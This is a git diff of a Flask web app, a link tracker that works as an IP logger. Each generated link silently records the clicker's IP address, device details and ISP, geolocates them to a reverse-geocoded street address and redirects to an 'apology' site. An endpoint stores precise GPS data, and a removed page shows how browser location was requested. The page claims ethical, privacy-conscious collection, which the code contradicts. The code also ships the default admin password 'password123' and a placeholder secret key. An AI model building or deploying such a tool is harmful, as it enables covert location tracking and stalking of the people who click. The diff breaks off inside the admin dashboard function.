@@ -1,19 +1,30 @@
-from flask import Flask, render_template_string, redirect, url_for, request, jsonify, g
+from flask import Flask, render_template_string, redirect, url_for, request, jsonify, g, session
 import uuid
 import requests
 import sqlite3
 import os
+import json
+import hashlib
+import time
 from datetime import datetime
+from functools import wraps
+from user_agents import parse
 
 app = Flask(__name__)
+app.secret_key = os.environ.get('SECRET_KEY', 'your-secret-key-change-this-in-production')
+
+# Admin credentials (change these!)
+ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
+ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'password123')
+
+# Redirect URL (your enhanced apology website!)
+REDIRECT_URL = 'https://apology-7duy.onrender.com'
 
 # Production configuration
 if os.environ.get('RAILWAY_ENVIRONMENT') or os.environ.get('RENDER') or os.environ.get('PORT'):
-    # Production mode
     app.config['DEBUG'] = False
     DATABASE = '/tmp/events.db' if os.environ.get('RENDER') else 'events.db'
 else:
-    # Development mode
     app.config['DEBUG'] = True
     DATABASE = 'events.db'
 
@@ -21,45 +32,64 @@ def get_db():
     db = getattr(g, '_database', None)
     if db is None:
         db = g._database = sqlite3.connect(DATABASE)
+        db.row_factory = sqlite3.Row
     return db
 
 def init_db():
-    """Initialize the database and create tables if they don't exist"""
+    """Initialize enhanced database with comprehensive user tracking"""
     try:
         with app.app_context():
             db = sqlite3.connect(DATABASE)
             
-            # Check if table exists and what columns it has
-            cursor = db.execute("PRAGMA table_info(events)")
-            columns = [column[1] for column in cursor.fetchall()]
+            # Drop old table if exists and create new enhanced one
+            db.execute('DROP TABLE IF EXISTS events')
             
-            if 'events' not in [table[0] for table in db.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()]:
-                # Create new table with all columns
-                db.execute('''CREATE TABLE events (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    ip TEXT,
-                    city TEXT,
-                    region TEXT,
-                    country TEXT,
-                    latitude TEXT,
-                    longitude TEXT,
-                    source TEXT DEFAULT 'unknown',
-                    address TEXT,
-                    timestamp TEXT
-                )''')
-                print("Created new events table with all columns")
-            else:
-                # Add missing columns to existing table
-                if 'source' not in columns:
-                    db.execute("ALTER TABLE events ADD COLUMN source TEXT DEFAULT 'unknown'")
-                    print("Added source column to existing table")
-                if 'address' not in columns:
-                    db.execute("ALTER TABLE events ADD COLUMN address TEXT")
-                    print("Added address column to existing table")
+            # Create comprehensive events table
+            db.execute('''CREATE TABLE events (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                link_id TEXT,
+                ip_address TEXT,
+                user_agent TEXT,
+                browser TEXT,
+                os TEXT,
+                device_type TEXT,
+                device_brand TEXT,
+                country TEXT,
+                region TEXT,
+                city TEXT,
+                timezone TEXT,
+                latitude TEXT,
+                longitude TEXT,
+                accuracy TEXT,
+                altitude TEXT,
+                speed TEXT,
+                heading TEXT,
+                location_source TEXT,
+                address TEXT,
+                isp TEXT,
+                organization TEXT,
+                referrer TEXT,
+                language TEXT,
+                screen_resolution TEXT,
+                viewport_size TEXT,
+                connection_type TEXT,
+                battery_level TEXT,
+                online_status TEXT,
+                timestamp TEXT,
+                response_time_ms INTEGER
+            )''')
+            
+            # Create links table for better tracking
+            db.execute('''CREATE TABLE links (
+                id TEXT PRIMARY KEY,
+                created_at TEXT,
+                click_count INTEGER DEFAULT 0,
+                last_clicked TEXT
+            )''')
             
             db.commit()
             db.close()
-            print(f"Database initialized successfully at {DATABASE}")
+            print(f"Enhanced database initialized successfully at {DATABASE}")
     except Exception as e:
         print(f"Error initializing database: {e}")
 
@@ -69,582 +99,1122 @@ def close_connection(exception):
     if db is not None:
         db.close()
 
-# Initialize database when the module is imported (works with Gunicorn)
+def require_auth(f):
+    """Decorator for admin authentication"""
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        if 'authenticated' not in session:
+            return redirect(url_for('login'))
+        return f(*args, **kwargs)
+    return decorated_function
+
+# Initialize database
 init_db()
 
-# In-memory storage for link click counts and last visitor info
-link_clicks = {}
-last_clicked = {'link_id': None, 'count': 0}
-last_visitor = {
-    'ip': None,
-    'city': None,
-    'region': None,
-    'country': None,
-    'latitude': None,
-    'longitude': None
-}
-
-# Homepage template
+# Enhanced Homepage Template with Beautiful UI
 HOME_TEMPLATE = '''
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Shareable Link Generator</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ Lightning URL Tracker</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 40px; }
-        .link-box { margin: 20px 0; padding: 10px; background: #f0f0f0; border-radius: 6px; }
-        .count-box { margin: 20px 0; padding: 10px; background: #e0ffe0; border-radius: 6px; font-size: 1.2em; }
-        .geo-box { margin: 20px 0; padding: 10px; background: #e0f7ff; border-radius: 6px; font-size: 1.1em; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #333;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
+            max-width: 600px;
+            width: 90%;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .subtitle {
+            font-size: 1.1rem;
+            color: #666;
+            margin-bottom: 30px;
+        }
+        
+        .create-btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.2rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 600;
+        }
+        
+        .create-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.6);
+        }
+        
+        .link-result {
+            margin: 30px 0;
+            padding: 20px;
+            background: linear-gradient(135deg, #e8f5e8, #d4edda);
+            border-radius: 15px;
+            border-left: 5px solid #28a745;
+        }
+        
+        .generated-link {
+            background: rgba(255, 255, 255, 0.8);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 10px 0;
+            word-break: break-all;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+        
+        .copy-btn {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 20px;
+            cursor: pointer;
+            margin-left: 10px;
+            transition: all 0.3s ease;
+        }
+        
+        .copy-btn:hover {
+            background: #218838;
+            transform: scale(1.05);
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .stat-card {
+            background: rgba(255, 255, 255, 0.7);
+            padding: 20px;
+            border-radius: 15px;
+            border-left: 4px solid #667eea;
+        }
+        
+        .stat-number {
+            font-size: 2rem;
+            font-weight: bold;
+            color: #667eea;
+        }
+        
+        .stat-label {
+            color: #666;
+            font-size: 0.9rem;
+            margin-top: 5px;
+        }
+        
+        .features {
+            margin: 30px 0;
+            text-align: left;
+        }
+        
+        .feature-item {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            color: #555;
+        }
+        
+        .feature-icon {
+            margin-right: 10px;
+            font-size: 1.2rem;
+        }
+        
+        .footer-note {
+            margin-top: 30px;
+            font-size: 0.9rem;
+            color: #888;
+            border-top: 1px solid rgba(0,0,0,0.1);
+            padding-top: 20px;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+                margin: 20px;
+            }
+            
+            h1 {
+                font-size: 2rem;
+            }
+            
+            .create-btn {
+                padding: 12px 30px;
+                font-size: 1rem;
+            }
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
     </style>
 </head>
 <body>
-    <h1>Shareable Link Generator</h1>
-    <form method="post" action="/create_link">
-        <button type="submit">Create Shareable Link</button>
-    </form>
-    {% if link_url %}
-        <div class="link-box">
-            <strong>Your shareable link:</strong> <a href="{{ link_url }}" target="_blank">{{ link_url }}</a>
+    <div class="container">
+        <h1>⚡ Lightning URL Tracker</h1>
+        <p class="subtitle">Create trackable links and gather comprehensive visitor analytics</p>
+        
+        <form method="post" action="/create_link">
+            <button type="submit" class="create-btn pulse">🚀 Generate Tracking Link</button>
+        </form>
+        
+        {% if link_url %}
+        <div class="link-result">
+            <h3>✅ Your Tracking Link is Ready!</h3>
+            <div class="generated-link">
+                <span id="linkText">{{ link_url }}</span>
+                <button class="copy-btn" onclick="copyToClipboard()">📋 Copy</button>
+            </div>
+            <p style="color: #666; margin-top: 10px;">
+                Share this link to track clicks and gather visitor data!
+            </p>
         </div>
-    {% endif %}
-    {% if last_clicked_id %}
-        <div class="count-box">
-            Link <b>{{ last_clicked_id }}</b> has been clicked <b>{{ last_clicked_count }}</b> times.
+        {% endif %}
+        
+        {% if total_links > 0 %}
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-number">{{ total_links }}</div>
+                <div class="stat-label">Total Links Created</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">{{ total_clicks }}</div>
+                <div class="stat-label">Total Clicks Tracked</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">{{ total_visitors }}</div>
+                <div class="stat-label">Unique Visitors</div>
+            </div>
         </div>
-    {% endif %}
-    {% if last_visitor_ip %}
-        <div class="geo-box">
-            <strong>Last Visitor Info:</strong><br>
-            IP: {{ last_visitor_ip }}<br>
-            Location: {{ last_visitor_city }}, {{ last_visitor_region }}, {{ last_visitor_country }}<br>
-            Latitude: {{ last_visitor_latitude }}<br>
-            Longitude: {{ last_visitor_longitude }}
+        {% endif %}
+        
+        <div class="features">
+            <h3 style="text-align: center; margin-bottom: 20px;">🎯 What We Track</h3>
+            <div class="feature-item">
+                <span class="feature-icon">🌍</span>
+                <span>Precise GPS location (with permission) + IP geolocation</span>
+            </div>
+            <div class="feature-item">
+                <span class="feature-icon">💻</span>
+                <span>Device info: Browser, OS, screen resolution</span>
+            </div>
+            <div class="feature-item">
+                <span class="feature-icon">🔍</span>
+                <span>User behavior: Referrer, language, connection type</span>
+            </div>
+            <div class="feature-item">
+                <span class="feature-icon">⚡</span>
+                <span>Performance: Response times and loading speeds</span>
+            </div>
+            <div class="feature-item">
+                <span class="feature-icon">🛡️</span>
+                <span>Privacy-conscious with secure data handling</span>
+            </div>
         </div>
-    {% endif %}
-    <br><a href="/events">View All Events (Admin)</a>
+        
+        <div class="footer-note">
+            <p>🔒 All data is collected ethically and securely stored. Users are redirected to an interactive experience!</p>
+        </div>
+    </div>
+    
+    <script>
+        function copyToClipboard() {
+            const linkText = document.getElementById('linkText').textContent;
+            navigator.clipboard.writeText(linkText).then(function() {
+                const btn = document.querySelector('.copy-btn');
+                btn.textContent = '✅ Copied!';
+                btn.style.background = '#28a745';
+                setTimeout(() => {
+                    btn.textContent = '📋 Copy';
+                    btn.style.background = '#28a745';
+                }, 2000);
+            });
+        }
+        
+        // Add some interactive effects
+        document.addEventListener('DOMContentLoaded', function() {
+            const statCards = document.querySelectorAll('.stat-card');
+            statCards.forEach((card, index) => {
+                setTimeout(() => {
+                    card.style.opacity = '0';
+                    card.style.transform = 'translateY(20px)';
+                    card.style.transition = 'all 0.5s ease';
+                    setTimeout(() => {
+                        card.style.opacity = '1';
+                        card.style.transform = 'translateY(0)';
+                    }, 100);
+                }, index * 200);
+            });
+        });
+    </script>
 </body>
 </html>
 '''
 
-# Redirecting page template
-REDIRECT_TEMPLATE = '''
+# Login Template
+LOGIN_TEMPLATE = '''
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Link Clicked</title>
-    <meta http-equiv="refresh" content="10;url={{ youtube_url }}">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔐 Admin Login - URL Tracker</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 40px; }
-        .redirect-box { margin: 40px 0; padding: 20px; background: #fffbe0; border-radius: 6px; font-size: 1.2em; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .login-container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+        
+        .login-header {
+            font-size: 2rem;
+            margin-bottom: 30px;
+            color: #333;
+        }
+        
+        .form-group {
+            margin: 20px 0;
+            text-align: left;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 500;
+        }
+        
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 1rem;
+            transition: border-color 0.3s ease;
+        }
+        
+        input[type="text"]:focus, input[type="password"]:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        
+        .login-btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.1rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            margin-top: 20px;
+        }
+        
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+        }
+        
+        .error {
+            background: #ffe6e6;
+            color: #d63384;
+            padding: 10px;
+            border-radius: 10px;
+            margin: 15px 0;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .back-link {
+            margin-top: 20px;
+            color: #667eea;
+            text-decoration: none;
+        }
+        
+        .back-link:hover {
+            text-decoration: underline;
+        }
     </style>
-    <script>
-        let locationSaved = false;
-        
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendPosition, fallbackToIP);
-            } else {
-                document.getElementById("location").innerText = "Geolocation not supported. Using IP location...";
-                fallbackToIP();
-            }
-        }
-        
-        function sendPosition(position) {
-            var lat = position.coords.latitude;
-            var lon = position.coords.longitude;
-            console.log("Browser location obtained:", lat, lon);
-            
-            fetch('/save_location', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    latitude: lat, 
-                    longitude: lon, 
-                    source: 'browser' 
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                locationSaved = true;
-                document.getElementById("location").innerText =
-                    "Precise Location: " + data.latitude + ", " + data.longitude + " (Browser GPS - Saved!)";
-                console.log("Location saved successfully:", data);
-            })
-            .catch((error) => {
-                console.error("Error saving location:", error);
-                document.getElementById("location").innerText = "Could not save precise location. Using IP location...";
-                fallbackToIP();
-            });
-        }
-        
-        function fallbackToIP() {
-            if (locationSaved) return; // Don't fallback if we already saved precise location
-            
-            console.log("Using IP-based geolocation fallback");
-            fetch('/save_ip_location', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ source: 'ip' })
-            })
-            .then(response => response.json())
-            .then(data => {
-                locationSaved = true;
-                if (data.latitude && data.longitude) {
-                    document.getElementById("location").innerText =
-                        "IP Location: " + data.latitude + ", " + data.longitude + " (" + data.city + ", " + data.country + " - Saved!)";
-                } else {
-                    document.getElementById("location").innerText = "Location saved using IP address.";
-                }
-                console.log("IP location saved:", data);
-            })
-            .catch((error) => {
-                console.error("Error saving IP location:", error);
-                document.getElementById("location").innerText = "Location services unavailable.";
-            });
-        }
-        
-        function showError(error) {
-            console.log("Geolocation error:", error.message);
-            let errorMsg = "";
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    errorMsg = "Location access denied. Using IP location...";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    errorMsg = "Location unavailable. Using IP location...";
-                    break;
-                case error.TIMEOUT:
-                    errorMsg = "Location timeout. Using IP location...";
-                    break;
-                default:
-                    errorMsg = "Location error. Using IP location...";
-                    break;
-            }
-            document.getElementById("location").innerText = errorMsg;
-            fallbackToIP();
-        }
-        
-        window.onload = getLocation;
-    </script>
 </head>
 <body>
-    <div class="redirect-box">
-        <h2>Link clicked!</h2>
-        <p>This link has been clicked <b>{{ count }}</b> times.</p>
-        <p id="location">Retrieving your location...</p>
-        <p>Redirecting you to <a href="{{ youtube_url }}" target="_blank">YouTube</a> in a few seconds...</p>
+    <div class="login-container">
+        <div class="login-header">🔐 Admin Access</div>
+        
+        {% if error %}
+        <div class="error">{{ error }}</div>
+        {% endif %}
+        
+        <form method="post">
+            <div class="form-group">
+                <label for="username">Username:</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            
+            <button type="submit" class="login-btn">🚀 Access Dashboard</button>
+        </form>
+        
+        <a href="/" class="back-link">← Back to Home</a>
     </div>
-    <a href="/">Back to Home</a>
 </body>
 </html>
 '''
 
 @app.route('/', methods=['GET'])
 def home():
-    link_url = None
-    last_clicked_id = last_clicked['link_id']
-    last_clicked_count = last_clicked['count']
-    return render_template_string(
-        HOME_TEMPLATE,
-        link_url=link_url,
-        last_clicked_id=last_clicked_id,
-        last_clicked_count=last_clicked_count,
-        last_visitor_ip=last_visitor['ip'],
-        last_visitor_city=last_visitor['city'],
-        last_visitor_region=last_visitor['region'],
-        last_visitor_country=last_visitor['country'],
-        last_visitor_latitude=last_visitor['latitude'],
-        last_visitor_longitude=last_visitor['longitude']
-    )
+    """Enhanced homepage with statistics"""
+    start_time = time.time()
+    
+    try:
+        db = get_db()
+        
+        # Get statistics
+        total_links = db.execute('SELECT COUNT(*) FROM links').fetchone()[0]
+        total_clicks = db.execute('SELECT SUM(click_count) FROM links').fetchone()[0] or 0
+        total_visitors = db.execute('SELECT COUNT(DISTINCT ip_address) FROM events').fetchone()[0]
+        
+        response_time = int((time.time() - start_time) * 1000)
+        
+        return render_template_string(HOME_TEMPLATE,
+            link_url=request.args.get('link'),
+            total_links=total_links,
+            total_clicks=total_clicks,
+            total_visitors=total_visitors,
+            response_time=response_time
+        )
+    except Exception as e:
+        print(f"Error loading homepage: {e}")
+        return render_template_string(HOME_TEMPLATE)
 
 @app.route('/create_link', methods=['POST'])
 def create_link():
-    link_id = str(uuid.uuid4())
-    link_clicks[link_id] = 0
-    link_url = url_for('link_clicked', link_id=link_id, _external=True)
-    return render_template_string(
-        HOME_TEMPLATE,
-        link_url=link_url,
-        last_clicked_id=last_clicked['link_id'],
-        last_clicked_count=last_clicked['count'],
-        last_visitor_ip=last_visitor['ip'],
-        last_visitor_city=last_visitor['city'],
-        last_visitor_region=last_visitor['region'],
-        last_visitor_country=last_visitor['country'],
-        last_visitor_latitude=last_visitor['latitude'],
-        last_visitor_longitude=last_visitor['longitude']
-    )
+    """Create a new tracking link"""
+    try:
+        link_id = str(uuid.uuid4())[:8]
+        
+        db = get_db()
+        db.execute('INSERT INTO links (id, created_at) VALUES (?, ?)',
+                  (link_id, datetime.utcnow().isoformat()))
+        db.commit()
+        
+        link_url = request.url_root + f'l/{link_id}'
+        return redirect(url_for('home') + f'?link={link_url}')
+        
+    except Exception as e:
+        print(f"Error creating link: {e}")
+        return redirect(url_for('home'))
 
-@app.route('/link/<link_id>')
-def link_clicked(link_id):
-    if link_id in link_clicks:
-        link_clicks[link_id] += 1
-        count = link_clicks[link_id]
-        last_clicked['link_id'] = link_id
-        last_clicked['count'] = count
-    else:
-        count = 0
+@app.route('/l/<link_id>')
+def track_and_redirect(link_id):
+    """Enhanced tracking with comprehensive data collection and direct redirect"""
+    start_time = time.time()
     
-    # Get user IP
-    if request.headers.get('X-Forwarded-For'):
-        ip = request.headers.get('X-Forwarded-For').split(',')[0]
-    else:
-        ip = request.remote_addr
-    
-    print(f"[Link Clicked] Link ID: {link_id}, Count: {count}, IP: {ip}")
-    
-    # Get geolocation info using improved function
-    geo_data = get_ip_geolocation(ip)
-    city = geo_data.get('city', 'Unknown')
-    region = geo_data.get('region_name', 'Unknown')
-    country = geo_data.get('country_name', 'Unknown')
-    ip_lat = geo_data.get('latitude', 'Unknown')
-    ip_lng = geo_data.get('longitude', 'Unknown')
-    
-    print(f"[IP Geolocation] City: {city}, Region: {region}, Country: {country}, Lat: {ip_lat}, Lng: {ip_lng}")
-    
-    last_visitor['ip'] = ip
-    last_visitor['city'] = city
-    last_visitor['region'] = region
-    last_visitor['country'] = country
-    last_visitor['ip_latitude'] = ip_lat
-    last_visitor['ip_longitude'] = ip_lng
-    # Browser lat/lon will be set by /save_location if available
-    
-    youtube_url = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'
-    return render_template_string(REDIRECT_TEMPLATE, count=count, youtube_url=youtube_url)
+    try:
+        # Get client information
+        user_agent_string = request.headers.get('User-Agent', '')
+        user_agent = parse(user_agent_string)
+        client_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
+        if client_ip and ',' in client_ip:
+            client_ip = client_ip.split(',')[0].strip()
+        
+        # Get comprehensive client data
+        client_data = {
+            'link_id': link_id,
+            'ip_address': client_ip,
+            'user_agent': user_agent_string,
+            'browser': f"{user_agent.browser.family} {user_agent.browser.version_string}",
+            'os': f"{user_agent.os.family} {user_agent.os.version_string}",
+            'device_type': user_agent.device.family,
+            'device_brand': user_agent.device.brand or 'Unknown',
+            'referrer': request.headers.get('Referer', 'Direct'),
+            'language': request.headers.get('Accept-Language', '').split(',')[0] if request.headers.get('Accept-Language') else 'Unknown',
+            'timestamp': datetime.utcnow().isoformat(),
+            'response_time_ms': 0  # Will be updated after processing
+        }
+        
+        # Get IP geolocation
+        geo_data = get_ip_geolocation(client_ip)
+        client_data.update({
+            'country': geo_data.get('country_name', 'Unknown'),
+            'region': geo_data.get('region_name', 'Unknown'),
+            'city': geo_data.get('city', 'Unknown'),
+            'timezone': geo_data.get('timezone', 'Unknown'),
+            'latitude': str(geo_data.get('latitude', 'Unknown')),
+            'longitude': str(geo_data.get('longitude', 'Unknown')),
+            'location_source': 'ip_geolocation',
+            'isp': geo_data.get('isp', 'Unknown'),
+            'organization': geo_data.get('org', 'Unknown')
+        })
+        
+        # Get address from coordinates if available
+        if client_data['latitude'] != 'Unknown' and client_data['longitude'] != 'Unknown':
+            try:
+                address = get_address_from_coords(client_data['latitude'], client_data['longitude'])
+                client_data['address'] = address
+            except:
+                client_data['address'] = 'Address lookup failed'
+        
+        # Calculate response time
+        client_data['response_time_ms'] = int((time.time() - start_time) * 1000)
+        
+        # Save to database
+        db = get_db()
+        
+        # Insert comprehensive event data
+        columns = ', '.join(client_data.keys())
+        placeholders = ', '.join(['?'] * len(client_data))
+        query = f'INSERT INTO events ({columns}) VALUES ({placeholders})'
+        
+        db.execute(query, list(client_data.values()))
+        
+        # Update link click count
+        db.execute('UPDATE links SET click_count = click_count + 1, last_clicked = ? WHERE id = ?',
+                  (datetime.utcnow().isoformat(), link_id))
+        
+        db.commit()
+        
+        print(f"[Track] {client_ip} clicked {link_id} - Response: {client_data['response_time_ms']}ms")
+        
+        # Direct redirect to your apology website (no intermediate page)
+        return redirect(REDIRECT_URL)
+        
+    except Exception as e:
+        print(f"Error tracking click: {e}")
+        # Still redirect even if tracking fails
+        return redirect(REDIRECT_URL)
 
 @app.route('/save_location', methods=['POST'])
-def save_location():
-    data = request.get_json()
-    lat = data.get('latitude')
-    lon = data.get('longitude')
-    source = data.get('source', 'browser')
-    
-    print(f"[Location Received] Source: {source}, Latitude: {lat}, Longitude: {lon}")
-    
-    # Get address from coordinates
-    address = get_address_from_coords(lat, lon)
-    print(f"[Address Resolution] {address}")
-    
-    last_visitor['latitude'] = lat
-    last_visitor['longitude'] = lon
-    last_visitor['address'] = address
-    
-    # Save to DB
-    ip = last_visitor.get('ip', 'Unknown')
-    city = last_visitor.get('city', 'Unknown')
-    region = last_visitor.get('region', 'Unknown')
-    country = last_visitor.get('country', 'Unknown')
-    timestamp = datetime.utcnow().isoformat()
-    
+def save_precise_location():
+    """Save precise GPS location from browser"""
     try:
+        data = request.json
+        latitude = data.get('latitude')
+        longitude = data.get('longitude')
+        accuracy = data.get('accuracy')
+        altitude = data.get('altitude')
+        speed = data.get('speed')
+        heading = data.get('heading')
+        
+        client_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
+        if client_ip and ',' in client_ip:
+            client_ip = client_ip.split(',')[0].strip()
+        
+        # Update the most recent event for this IP with precise GPS data
         db = get_db()
-        db.execute('INSERT INTO events (ip, city, region, country, latitude, longitude, source, address, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
-                   (ip, city, region, country, str(lat), str(lon), source, address, timestamp))
+        
+        address = get_address_from_coords(latitude, longitude)
+        
+        # Update latest event from this IP with GPS data
+        db.execute('''UPDATE events SET 
+                     latitude = ?, longitude = ?, accuracy = ?, altitude = ?,
+                     speed = ?, heading = ?, location_source = ?, address = ?
+                     WHERE ip_address = ? AND id = (
+                         SELECT MAX(id) FROM events WHERE ip_address = ?
+                     )''', 
+                  (str(latitude), str(longitude), str(accuracy), str(altitude),
+                   str(speed), str(heading), 'browser_gps', address,
+                   client_ip, client_ip))
+        
         db.commit()
-        print(f"[Database] Saved - IP: {ip}, City: {city}, Lat: {lat}, Lng: {lon}, Address: {address[:50]}..., Source: {source}")
+        
+        return jsonify({
+            'status': 'success',
+            'latitude': latitude,
+            'longitude': longitude,
+            'address': address,
+            'source': 'browser_gps'
+        })
+        
     except Exception as e:
-        print(f"[Database Error] Failed to save location: {e}")
-    
-    return jsonify({
-        'latitude': lat, 
-        'longitude': lon, 
-        'source': source,
-        'city': city,
-        'country': country,
-        'address': address
-    })
+        print(f"Error saving precise location: {e}")
+        return jsonify({'status': 'error', 'message': str(e)})
 
-@app.route('/save_ip_location', methods=['POST'])
-def save_ip_location():
-    """Fallback endpoint that uses IP-based geolocation when browser location is denied"""
-    data = request.get_json()
-    source = 'ip_fallback'
-    
-    # Use the IP-based coordinates we already fetched
-    ip_lat = last_visitor.get('ip_latitude', 'Unknown')
-    ip_lng = last_visitor.get('ip_longitude', 'Unknown')
-    
-    print(f"[IP Location Fallback] Using IP-based coordinates: Lat: {ip_lat}, Lng: {ip_lng}")
-    
-    # Get address from IP coordinates
-    address = "Address from IP location"
-    if ip_lat != 'Unknown' and ip_lng != 'Unknown':
-        address = get_address_from_coords(ip_lat, ip_lng)
-    
-    # Set these as the main coordinates since browser location failed
-    last_visitor['latitude'] = ip_lat
-    last_visitor['longitude'] = ip_lng
-    last_visitor['address'] = address
-    
-    # Save to DB
-    ip = last_visitor.get('ip', 'Unknown')
-    city = last_visitor.get('city', 'Unknown')
-    region = last_visitor.get('region', 'Unknown')
-    country = last_visitor.get('country', 'Unknown')
-    timestamp = datetime.utcnow().isoformat()
-    
-    try:
-        db = get_db()
-        db.execute('INSERT INTO events (ip, city, region, country, latitude, longitude, source, address, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
-                   (ip, city, region, country, str(ip_lat), str(ip_lng), source, address, timestamp))
-        db.commit()
-        print(f"[Database] IP Fallback Saved - IP: {ip}, City: {city}, Lat: {ip_lat}, Lng: {ip_lng}, Address: {address[:50]}..., Source: {source}")
-    except Exception as e:
-        print(f"[Database Error] Failed to save IP location: {e}")
-    
-    return jsonify({
-        'latitude': ip_lat, 
-        'longitude': ip_lng, 
-        'source': source,
-        'city': city,
-        'country': country,
-        'address': address
-    })
-
-@app.route('/events')
-def events():
-    try:
-        db = get_db()
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    """Admin login"""
+    if request.method == 'POST':
+        username = request.form.get('username')
+        password = request.form.get('password')
         
-        # Get total count first
-        count_cur = db.execute('SELECT COUNT(*) FROM events')
-        total_events = count_cur.fetchone()[0]
-        
-        # Check what columns exist
-        cursor = db.execute("PRAGMA table_info(events)")
-        columns = [column[1] for column in cursor.fetchall()]
-        
-        # Build query based on available columns
-        if 'address' in columns and 'source' in columns:
-            query = 'SELECT ip, city, region, country, latitude, longitude, source, address, timestamp FROM events ORDER BY id DESC'
-        elif 'source' in columns:
-            query = 'SELECT ip, city, region, country, latitude, longitude, source, timestamp FROM events ORDER BY id DESC'
+        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
+            session['authenticated'] = True
+            return redirect(url_for('admin_dashboard'))
         else:
-            query = 'SELECT ip, city, region, country, latitude, longitude, timestamp FROM events ORDER BY id DESC'
+            return render_template_string(LOGIN_TEMPLATE, error="Invalid credentials")
+    
+    return render_template_string(LOGIN_TEMPLATE)
+
+@app.route('/logout')
+def logout():
+    """Admin logout"""
+    session.pop('authenticated', None)
+    return redirect(url_for('home'))
+
+@app.route('/admin')
+@require_auth
+def admin_dashboard():
+    """Comprehensive admin dashboard"""
+    try:
+        db = get_db()
         
